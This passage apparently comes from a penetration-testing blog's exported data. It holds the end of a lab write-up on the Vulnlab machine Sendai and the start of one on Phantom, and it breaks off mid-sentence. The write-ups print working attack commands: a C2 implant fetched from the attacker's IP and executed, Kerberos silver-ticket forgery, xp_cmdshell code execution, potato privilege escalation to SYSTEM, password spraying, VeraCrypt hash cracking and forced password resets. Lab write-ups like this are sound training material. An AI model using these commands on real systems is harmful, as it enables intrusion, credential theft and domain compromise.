id=\"PrivEsc-Method-2-MSSQL\"><a href=\"#PrivEsc-Method-2-MSSQL\" class=\"headerlink\" title=\"PrivEsc Method #2 - MSSQL\"></a>PrivEsc Method #2 - MSSQL</h1><p>I was also able to discover another method for privilege escalation on the machine, this attack being through MSSQL. If you’ll notice in the <code>Users</code> directory, there seems to be another user on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\users&gt; ls</span><br><span class=\"line\">Directory: C:\\users</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         7/18/2023   6:09 AM                Administrator</span><br><span class=\"line\">d-----          7/6/2024   8:12 PM                mgtsvc$</span><br><span class=\"line\">d-r---         7/11/2023  12:36 AM                Public</span><br><span class=\"line\">d-----          7/6/2024   8:05 PM                sqlsvc</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>sqlsvc</code> account, hinting that there may be an MSSQL service running on this machine. Let’s do a <code>netstat</code> scan to see if our theory is correct.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\users&gt; netstat -a</span><br><span class=\"line\">Active Connections</span><br><span class=\"line\">Proto  Local Address          Foreign Address        State</span><br><span class=\"line\">......</span><br><span class=\"line\">  TCP    0.0.0.0:1433           dc:0                   LISTENING</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, an MSSQL service is indeed running on the machine.</p>\n<p>What’s interesting as well is that, during my initial enumeration of the filesystem, I found an interesting file that might hint towards an attack on MSSQL.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\config&gt; ls</span><br><span class=\"line\">Directory: C:\\config</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         7/11/2023   5:57 AM             78 .sqlconfig</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\config&gt; cat .sqlconfig</span><br><span class=\"line\">Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=[...snip...];</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have found a configuration file underneath <code>C:\\config</code>, which is also hosted as an SMB share - although you won’t have access to this share until you get access to <code>mgtsvc$</code>.</p>\n<p>Now that we have a password for <code>sqlsvc</code>, what exactly can we do with this? At this point it would make sense to authenticate to their account using WinRM, however they are not a part of the <code>Remote Management Operators</code>. You will notice that they do have an SPN to MSSQL within Bloodhound.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/i.png\"></p>\n<p>At this point, I immediately thought back to what we had done for <a href=\"https://dan-feliciano.com/2024/06/29/breach/\">Breach</a>. Given that we have the plaintext password for an account that has an SPN set to MSSQL (which seems to be the MSSQL service account), we can potentially exploit a <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">Silver ticket attack</a>.</p>\n<p>With the silver ticket attack, we can gain command execution access through MSSQL by impersonating the Administrator user. Let’s first start up <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> and set up a SOCKS proxy, as the MSSQL service is not externally facing and is behind a firewall (since we didn’t see it on our initial NMAP scan).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\">sliver &gt; generate --mtls (KALI IP) --os windows --arch amd64 --format exe --save (SAVE PATH) --name sendai</span><br></pre></td></tr></table></figure>\n\n<p>Let’s then execute the Sliver implant to receive a session on our Sliver server - to which we can start a SOCKS proxy on.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://10.8.0.173:9001/sendai.exe -O sendai.exe</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; .\\sendai.exe</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 9976dc7b sendai - 10.10.98.227:60658 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:24:25 EDT</span><br><span class=\"line\"></span><br><span class=\"line\">sliver &gt; use 9976dc7b-addd-44c8-9ac1-b8960b009c67</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Active session sendai (9976dc7b-addd-44c8-9ac1-b8960b009c67)</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (sendai) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class=\"line\">⚠  In-band SOCKS proxies can be a little unstable depending on protocol</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a SOCKS proxy running, make sure to update <code>/etc/proxychains4.conf</code> at the bottom of the file to reflect the interface (<code>127.0.0.1</code>) and the port (<code>1081</code>) that the proxy is listening on.</p>\n<p>We can then use <code>proxychains4</code> to execute commands through the firewall.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 nmap -sT -p1433 10.10.98.227         </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Nmap scan report for sendai.vl (10.10.98.227)</span><br><span class=\"line\">Host is up (0.26s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have access to the MSSQL ticket, we’ll need to craft our Silver ticket in order to authenticate as the Administrator user.</p>\n<p>In order to do this, we’ll need a few objects relative to domain identification.</p>\n<ul>\n<li>The domain SID - <code>S-1-5-21-3085872742-570972823-736764132</code> (Can be found in Bloodhound).</li>\n<li>The NT Hash of the SQL service account - (Can be crafted using web tools like <a href=\"https://codebeautify.org/ntlm-hash-generator\">this</a> along with SQLSVC’s plaintext password).</li>\n<li>The SPN our service account has - <code>MSSQL/dc.sendai.vl</code>.</li>\n<li>The name of the user we want to impersonate - Administrator.</li>\n</ul>\n<p>Putting this all together, you should receive a command similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-ticketer -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash 58655C0[...snip...]78C2D96A -spn MSSQL/dc.sendai.vl -dc-ip 10.10.98.227 -domain sendai.vl Administrator</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can then set our Kerberos authentication global variable on Kali to be directed to the ticket file that was generated. This will then be followed by our authentication attempt into MSSQL through our proxy.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -k dc.sendai.vl</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  dc.sendai.vl:1433  ...  OK</span><br><span class=\"line\">[*] Encryption required, switching to TLS</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class=\"line\">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class=\"line\">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class=\"line\">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>\n\n<p>Now that we are authenticated to MSSQL in the context of Administrator (we still only have the privileges of <code>SQLSVC</code>), we can enable command execution using the <code>enable_xp_cmdshell</code> tool that comes built into this client.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; enable_xp_cmdshell</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>\n\n<p>Let’s now run <code>xp_cmdshell</code> to execute local commands and execute our Sliver implant we put on the filesystem earlier.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; xp_cmdshell powershell &quot;cd C:\\temp; .\\sendai.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/j.png\"></p>\n<h1 id=\"PrivEsc-Method-2-cont-SeImpersonatePrivilege\"><a href=\"#PrivEsc-Method-2-cont-SeImpersonatePrivilege\" class=\"headerlink\" title=\"PrivEsc Method #2 (cont.) - SeImpersonatePrivilege\"></a>PrivEsc Method #2 (cont.) - SeImpersonatePrivilege</h1><p>Now that we have a session as <code>SQLSVC</code>, we’ll find that they have <code>SeImpersonatePrivilege</code> enabled on their account. I’ve covered this before, however I’ll just give a brief overview as to how it works.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; sa-whoami</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully executed sa-whoami (coff-loader)</span><br><span class=\"line\">[*] Got output:</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                                       State                         </span><br><span class=\"line\">============================= ================================================= ===========================</span><br><span class=\"line\">SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      </span><br><span class=\"line\">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      </span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      </span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       </span><br><span class=\"line\">SeManageVolumePrivilege       Perform volume maintenance tasks                  Enabled                       </span><br><span class=\"line\">SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects                             Enabled                       </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled</span><br></pre></td></tr></table></figure>\n\n<p>Service accounts, by default, will have this privilege along with <code>SeAssignPrimaryTokenPrivilege</code>. Having <code>SeImpersonatePrivilege</code> essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p>We can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM. If we direct this towards our implant, we should be able to receive a Sliver session as SYSTEM.</p>\n<p>You can use any binaries within the Potato family for our exploit to force SYSTEM to authenticate to our endpoint. In the past, I’ve used <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a> due to AV restrictions, however that is not the case here as AV is not enabled on this machine. I’ll use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> in our case, since I already have it compiled with Visual Studio on my machine.</p>\n<p>We can execute this through Sliver’s built-in .NET assembly command tools.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; execute-assembly SweetPotato.exe &#x27;-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\sendai.exe&quot; -e EfsRpc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b54f2ec8-c934-40f1-885c-2b715199b7af/\\b54f2ec8-c934-40f1-885c-2b715199b7af\\b54f2ec8-c934-40f1-885c-2b715199b7af</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 4afdd3a6 sendai - 10.10.98.227:49917 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:47:19 EDT</span><br></pre></td></tr></table></figure>\n\n<p>If all was done correctly, this should generate a Sliver callback session as SYSTEM as it did for me denoted above. Since we have an account as SYSTEM, we can now essentially control the machine as we’d like. We can dump all of the domain user hashes and secrets, establish persistence through services, etc.</p>\n<p>Since we have access as SYSTEM though, we can read the root flag of this machine. This means we have successfully compromised this machine using this method!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; cat &quot;C:\\Users\\Administrator\\Desktop\\root.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/k.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was an incredible environment that helped me bounce off of tactics that I had actually learned in previous Vulnlab machines. Using ADCS or creating a Silver ticket through MSSQL is something that I’ve done before, and it was really great to be able to put that same knowledge into this machine. There could potentially be other methods that I am not aware about, but nonetheless I think I’m satisfied with the work that I’ve done for Sendai.</p>\n<p>Big thanks goes out to xct for the development of this machine and for the continued practice with red teaming.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/dirkjanm/krbrelayx\">https://github.com/dirkjanm/krbrelayx</a><br><a href=\"https://github.com/GhostPack/Seatbelt\">https://github.com/GhostPack/Seatbelt</a><br><a href=\"https://github.com/itm4n/PrivescCheck\">https://github.com/itm4n/PrivescCheck</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a><br><a href=\"https://github.com/GhostPack/Certify\">https://github.com/GhostPack/Certify</a><br><a href=\"https://github.com/GhostPack/Rubeus\">https://github.com/GhostPack/Rubeus</a><br><a href=\"https://github.com/ly4k/Certipy\">https://github.com/ly4k/Certipy</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://codebeautify.org/ntlm-hash-generator\">https://codebeautify.org/ntlm-hash-generator</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n"},{"title":"Phantom - Vulnlab","date":"2024-07-14T05:29:45.000Z","keywords":"Vulnlab, Medium, Windows","description":"Phantom is the latest machine that was released as of 7/13/2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.","cover":"/images/vulnlab/phantom-vl/phantom_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nPhantom is the latest machine that was released as of 7/13/2024. This machine involved Active Directory penetration testing along with some password decryption paths. I originally tried going for first blood on this machine, however the encryption portion was a little difficult for me and I ended up completing it a couple of days later. Cheers and thanks to the people that I worked alongside for this machine - you know who you are.\n\n# Enumeration\n\nLet's run an NMAP scan, our entry point to the domain controller is `10.10.103.169`.\n\n```\n└─$ sudo nmap 10.10.103.169\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 14:01 EDT\nNmap scan report for 10.10.103.169\nHost is up (0.11s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3269/tcp open  globalcatLDAPssl\n3389/tcp open  ms-wbt-server\n5357/tcp open  wsdapi\n\nNmap done: 1 IP address (1 host up) scanned in 17.87 seconds\n```\n\nIt seems to be a relatively standard AD machine. I doubt we'll need to be doing any web-app testing for this, as there does not seem to be any web ports open. The domain is `phantom.vl` and the DC DNS name is `dc.phantom.vl`, so we'll add these to our `/etc/hosts` file for later use.\n\nWe'll start with SMB first to see if there are anything we can pull from the shares.\n\n```\n└─$ smbclient -L 10.10.103.169 -N         \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        Departments Share Disk      \n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        Public          Disk      \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.103.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nIt seems that we have access to SMB through null authentication, and we are able to view a few of the shares that are available on the machine.\n\nThis is an immediate pivot to Kerberos, as we can essentially brute force all of the domain SIDs (including domain users) through `lookupsid` due to the fact that we can login to SMB without a password and view the shares.\n\n```\n└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/'daz'@10.10.103.169\n```\n\nThis should return a list of all of the SIDs, some of which are domain users. We can easily convert this into a user list using some filtering and basic regex. \n\n```\n└─$ impacket-lookupsid -domain-sids -no-pass -target-ip 10.10.103.169 phantom.vl/'daz'@10.10.103.169 | cut -d '\\' -f 2 | awk 'NR >= 29 {print $1}' > full_ul.txt\n```\n\nThis should convert the respective domain users (including a few false positives) into a list. We'll be able to use this once we receive a password for a user.\n\n# Email Foothold\n\nSince we have enumerated access to a few of the SMB shares, we can see specifically if any of them contain any files that we have read access on.\n\nWe don't have access to the `Department Share` as a null user, and `SYSVOL`/`NETLOGON` don't seem to have anything of use either. Let's look at the `Public` share.\n\n```\n└─$ smbclient \\\\\\\\10.10.103.169\\\\Public -N            \nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Thu Jul 11 11:03:14 2024\n  ..                                DHS        0  Sun Jul  7 04:39:30 2024\n  tech_support_email.eml              A    14565  Sat Jul  6 12:08:43 2024\n\n6127103 blocks of size 4096. 1085569 blocks available\nsmb: \\> get tech_support_email.eml \ngetting file \\tech_support_email.eml of size 14565 as tech_support_email.eml (28.2 KiloBytes/sec) (average 28.2 KiloBytes/sec)\n```\n\nThere seems to be a `.eml` file within this directory, containing a message from what seems to be tech support. A base64 encoded attachment was provided in this email, though it is unintelligible from our perspective on Linux (if we try to decode it with basic tools). I instead opted to copy it to my Windows host and open it through Outlook.\n\n![](/images/vulnlab/phantom-vl/b.png)\n\nIt seems that a basic password is provided for new users with this tech support document. This should be the default password for new users that are onboarded, so we can potentially test this against the user list that we currently have.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p '(EMAIL PASSWORD)' --continue-on-success\n......\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\ibryant:(EMAIL PASSWORD)\n```\n\nYou'll receive a few false positives when testing these credentials against the domain, as denoted by the unsuccessful bind message under each false positive.\n\nThat being said, a user/password match did seem to return within a successful bind for `ibryant`. Since they are successfully able to authenticate to LDAP, we can dump the domain using Bloodhound and the [Python ingestor](https://github.com/dirkjanm/BloodHound.py). \n\n```\n└─$ bloodhound-python -d 'phantom.vl' -u 'ibryant' -p '(IBRYANT PASSWORD)' -c all -ns 10.10.103.169 --zip\nINFO: Compressing output into 20240713234621_bloodhound.zip\n```\n\nAfter booting up Bloodhound and checking out our user's node, it does not seem that we have any outbound object controls/privileges over any other domain objects. Having the Bloodhound graph is still helpful for us later down the attack path for other users we compromise.\n\nI was able to find out after some password usage against SMB that we now have access to the `Department Share` SMB share with `ibryant`. Let's see what we can find within this share.\n\n```\n└─$ smbclient \\\\\\\\10.10.103.169\\\\Departments\\ Share -U 'ibryant'\nPassword for [WORKGROUP\\ibryant]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sat Jul  6 12:25:31 2024\n  ..                                DHS        0  Sun Jul  7 04:39:30 2024\n  Finance                             D        0  Sat Jul  6 12:25:11 2024\n  HR                                  D        0  Sat Jul  6 12:21:31 2024\n  IT                                  D        0  Thu Jul 11 10:59:02 2024\n\n6127103 blocks of size 4096. 1178542 blocks available\n```\n\nI did some spidering on this share, and it seems that there is notably a bit of information for the next exploit within the `IT` directory.\n\n# Cracking VeraCrypt Volume Passwords\n\nWithin this directory, exists a `veracrypt` Linux installation package along with a few other programs such as `TeamViewer` and `mRemoteNG`.\n\nWithin the `Backups` directory in this folder, seems to be a file with a `.hc` extension.\n\n```\nsmb: \\IT\\> cd Backup\nsmb: \\IT\\Backup\\> ls\n  .                                   D        0  Sat Jul  6 14:04:34 2024\n  ..                                  D        0  Thu Jul 11 10:59:02 2024\n  IT_BACKUP_201123.hc                 A 12582912  Sat Jul  6 14:04:14 2024\n\n6127103 blocks of size 4096. 1178408 blocks available\n```\n\nDoing some research on this file led me to interpret that this was an encrypted VeraCrypt volume. VeraCrypt in particular is an open disk encryption application that allows for further protection against files and filesystems, locking them behind encryption algorithms.\n\nThe encryption volume that we seem to have on our hands is a volume/filesystem related to an IT backup that the IT team (presumably the team the `ibryant` is being onboarded to) had previously conducted on `July 6`.\n\nI set up `veracrypt` locally on my Kali machine, you could use the installation package that is within the `IT` directory or install it from the [VeraCrypt](https://veracrypt.eu/en/Downloads.html) website.\n\n![](/images/vulnlab/phantom-vl/c.png)\n\nIt seems that we'll need to use a password or keyfile in order to mount this volume. This is one of the main security features that VeraCrypt offers, so we'll need to find the password to mount it.\n\nI did a bit of enumeration on the file share, and it doesn't seem that anything points towards a password that we could use. Password reusage from passwords such as `ibryant`'s password also does not seem to result in anything success. At this point - we could potentially brute force for this password, though we don't have much to build off of in terms of a password policy that these users might set this to. \n\nLuckily enough, `hashcat` offers a numerous amount of VeraCrypt hash cracking algorithms. The default encryption algorithm that VeraCrypt can use is `AES/SHA512 (legacy)`, which has a hash ID of 13721.\n\nNext, we'll need to define a rule for our password brute force. If we think about it from a real-world sense, there are common password policies that involve simple password mutation, such as date-of-birth or the users last name. Passwords also generally involve a few special characters and a capital letter.\n\nThe password mutation I decided to try in particular consisted of the following password attributes. The Wiki hint also solidifies this factor on the [machine's page](https://wiki.vulnlab.com/guidance/medium/phantom).\n\n* Capital letter, preferably the first alphanumeric character in the password.\n* Company/Machine name.\n* Year, can revolve of any permutation from 2022-2024 (based on the current year).\n* Special character (any)\n\nI started by creating a wordlist based on common strings from the machine name, ending up with a result such as this.\n\n```\n└─$ cat phantom.txt             \nphantom\nPhantom\nPHANTOM\nPHANT0M\nphant0m\nphantom.vl\nPHANTOM.VL\nphant0m.vl\nPHANT0M.vl\nPh4nt0m\nPH4NT0M\n```\n\nNow that we have our hash ID and our wordlist, the last thing that we'll need is our hashcat rule. I created a simple rule file that hashcat could parse based off of the expressions that it uses. In a rule file, you can generally state the ruleset appended to the end of each string in your wordlist like this.\n\n```\n└─$ cat phantom.rule \n$2 $0 $2 $3 $$\n$2 $0 $2 $3 $&\n$2 $0 $2 $3 $@\n$2 $0 $2 $3 $!\n$2 $0 $2 $3 $#\n$2 $0 $2 $3 $%\n$2 $0 $2 $3 $^\n$2 $0 $2 $3 $*\n$2 $0 $2 $3 $(\n$2 $0 $2 $3 $)\n$2 $0 $2 $3 $-\n$2 $0 $2 $3 $_\n$2 $0 $2 $3 $=\n$2 $0 $2 $3 $+\n```\n\nThis essentially states that each string will be appended by the year `2023` along with each special character on a regular keyboard (or at least most of them).\n\nNow that we have all of the components needed, we can proceed with our hash cracking. By default, the first 512 bytes of an encrypted VeraCrypt volume contain the password of the volume, however `hashcat` can parse this out if we give it the raw volume.\n\n```\n└─$ hashcat -a 0 -m 13721 IT_BACKUP_201123.hc phantom.txt -r phantom.rule \nhashcat (v6.2.6) starting\n......\nIT_BACKUP_201123.hc:[...snip...]                         \n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13721 (VeraCrypt SHA512 + XTS 512 bit (legacy))\nHash.Target......: IT_BACKUP_201123.hc\n```\n\nAs you can see, we were successfully able to crack the hash for the volume and can now mount the volume. The method that we used can be seen in real-world situations, so it was nice to test out and can really get you thinking on how a person might think to create a password.\n\nNow that we have the password, we should be able to mount the volume to a location on our local system to see its contents.\n\n![](/images/vulnlab/phantom-vl/d.png)\n\nAs you can see, it was saved under `/media/veracrypt1`.\n\n# Credential Hunting\n\nGiven that `veracrypt` only allocates a relatively small amount of storage to this mount (you may see a few full storage errors), we can simply copy all of the contents of this mount to a directory within our `/` filesystem. You can do so easily with `sudo cp -r * (DESIRED FILEPATH)`.\n\nDoing some enumeration on the volume brought me to an interesting file that contained a password for a user.\n\n```\nvpn {\n    sstp {\n        authentication {\n            local-users {\n                username lstanley {\n                    password \"[...snip...]\"\n                }\n            }\n```\n\nIf you unzip and decompress all of the archives within the volume you mounted, this will be within `/config/archive/config.boot`. It seems that after a bit of credential hunting, we were able to retrieve the password to the `lstanley` user.\n\nWhile we would assume this would be for their user, I decided to run a `crackmapexec` scan against the full user list that we have just in case it belongs to other users instead of `lstanley`.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u full_ul.txt -p '[...snip...]' --continue-on-success\n......\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\svc_sspr:[...snip...]\n```\n\nIt seems that a successful password match was found for `svc_sspr`.\n\nI also made sure to run this against WinRM, and it seems that this user is part of the `Remote Management Users` group.\n\n```\n└─$ crackmapexec winrm 10.10.103.169 -u svc_sspr -p '[...snip...]'\nSMB         10.10.103.169   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)\nHTTP        10.10.103.169   5985   DC               [*] http://10.10.103.169:5985/wsman\nWINRM       10.10.103.169   5985   DC               [+] phantom.vl\\svc_sspr:[...snip...] (Pwn3d!)\n```\n\nThis means we should be able to authenticate to WinRM using `evil-winrm` and read the first flag.\n\n```\n└─$ evil-winrm --ip 10.10.103.169 -u 'svc_sspr' -p '[...snip...]'\nEvil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\svc_sspr\\Documents> cat ..\\Desktop\\user.txt\nVL[...snip...]\n```\n\n# Domain Escalation as svc_sspr\n\nNow that we successfully have access to the machine - we could look around the filesystem to see if there are any pertinent files/applications that we could exploit. Below is a list of security checks that I performed to see if the filesystem possessed any important data.\n\n* Cached DPAPI credentials/master keys with `Seatbelt`.\n* Internal services using `netstat`.\n* Abnormal running programs with `ps`.\n* Credential Hunting on the filesystem.\n* Regular privilege escalation tactics with tools such as `PrivescCheck` and `Winpeas`.\n\nThough nothing seemed to come back with any successful results. I decided to turn my attention back to our Bloodhound graph to see if our user had any privileges over any other domain objects.\n\n![](/images/vulnlab/phantom-vl/e.png)\n\nIt seems as though `svc_sspr` has `ForceChangePassword` set over three domain users. This attribute essentially allows us to change the password of the domain user to any string of our choosing. This will allow us to take full control over this domain user and exploit any privileges that they have,\n\nWe can easily do so through RPC.\n\n```\n└─$ net rpc password \"crose\" \"Password123@\" -U \"phantom.vl\"/\"svc_sspr\"%\"(SVC_SSPR PASSWORD)\" -S \"dc.phantom.vl\"\n```\n\nThis should of theoretically changed the password for the user `crose`, and we can verify so in LDAP.\n\n```\n└─$ crackmapexec ldap 10.10.103.169 -u crose -p 'Password123@'                   \nSMB         10.10.103.169   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)\nLDAP        10.10.103.169   389    DC               [+] phantom.vl\\crose:Password123@\n```\n\nLooks like it works, we now possess the password for this user. They don't seem to have the ability to authenticate to the filesystem, so our privilege escalation must still be through the domain.\n\n![](/images/vulnlab/phantom-vl/f.png)\n\nIt seems that this user, `crose`, is within the `ICT Security` domain group. This means that by default, they have `AllowedToActOnBehalfOfOtherIdentity` privilege over the domain controller, `DC.PHANTOM.VL`.\n\nThis privilege essentially allows us to act on behalf of the domain controller, and request for service tickets on behalf of that domain computer. This privilege in particular allows us to exploit 